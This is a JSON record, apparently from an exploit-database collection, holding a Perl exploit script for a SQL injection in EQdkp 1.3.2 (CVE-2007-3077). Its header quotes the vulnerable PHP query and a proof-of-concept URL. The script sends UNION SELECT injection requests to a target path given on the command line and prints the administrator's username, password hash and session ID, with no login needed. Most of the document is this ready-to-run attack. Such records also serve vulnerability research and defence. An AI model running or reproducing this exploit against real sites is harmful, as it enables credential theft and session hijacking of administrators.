{
  "id": "4030",
  "title": "EQdkp 1.3.2 - &#039;listmembers.php&#039; SQL Injection",
  "cve": "CVE-2007-3077",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t\t      EQdkp <= 1.3.2 SQL Injection Exploit\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (listmembers.php):\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#  $sql = 'SELECT m.*, (m.member_earned-m.member_spent+m.member_adjustment) \t#\r\n#  AS member_current, member_status, r.rank_name, r.rank_hide, r.rank_prefix, \t#\r\n#  r.rank_suffix, c.class_name AS member_class, c.class_armor_type AS \t\t#\r\n#  armor_type, c.class_min_level AS min_level, c.class_max_level AS max_level\t#\r\n#  FROM ' . MEMBERS_TABLE . ' m, ' . MEMBER_RANKS_TABLE . ' r, ' . CLASS_TABLE \t#\r\n#  . ' c WHERE c.class_id = m.member_class_id AND (m.member_rank_id = \t\t#\r\n#  r.rank_id)';\t\t\t\t\t\t\t\t\t#\r\n#    \t\t\t\t\t\t\t\t\t\t#\r\n# \tif ( !empty($_GET['rank']) )\t\t\t\t\t\t#\r\n#    {\t\t\t\t\t\t\t\t\t\t#\r\n#        $sql .= \" AND r.rank_name='\" . urldecode($_GET['rank']) . \"'\";\t\t#\r\n#    }\t\t\t\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: http://victim.com/listmembers.php?show=all&rank=%2527 UNION SELECT \t#\r\n#      0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,user_password,0,NULL,NULL,0,0,0,0 \t#\r\n#      FROM eqdkp_users where user_id=1/*\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: Nothing, no authentication...nada!\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 1){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                  EQdkp <= 1.3.2 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_eqdkp.pl [PATH]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where EQdkp is located\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_eqdkp.pl http://victim.com/eqdkp/\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n\r\n$host = $ARGV[0] . \"listmembers.php?show=all&rank=%2527 UNION SELECT 0,username,0,0,0,0,0,0,0,0,0,0,0,0,0,user_password,0,NULL,NULL,0,0,0,0 FROM eqdkp_users where user_id=1/*\";\r\n$res = $b->request(HTTP::Request->new(GET=>$host));\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                  EQdkp <= 1.3.2 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\nif($res->content =~ /\"><i>(.*?)<\\/i><\\/a><\\/td>/){\r\nprint \"[+] Admin User : $1\\n\";}\r\n\r\nelse {print \"\\n[-] Unable to retrieve admin username...\"}\r\n\r\nif($res->content =~ /\">([0-9a-fA-F]{32})<\\/a><\\/td>/){\r\nprint \"[+] Admin Hash : $1\";}\r\n\r\nelse {print \"\\n[-] Unable to retrieve admin hash...\\n\";}\r\n\r\n$host = $ARGV[0] . \"listmembers.php?show=all&rank=%2527 UNION SELECT 0,session_id,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,NULL,NULL,0,0,0,0 FROM eqdkp_sessions where session_user_id=1/*\";\r\n$res = $b->request(HTTP::Request->new(GET=>$host));\r\n\r\nif($res->content =~ /\"><i>(.*?)<\\/i><\\/a><\\/td>/){\r\nprint \"[+] Admin SessionID : $1\\n\";} \r\n\r\nelse {print \"\\n[-] Unable to retrieve admin sessionid...he/she is not logged in!\\n\";}\r\n\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n\r\n# milw0rm.com [2007-06-04]",
  "url": "https://www.exploit-db.com/exploits/4030"
}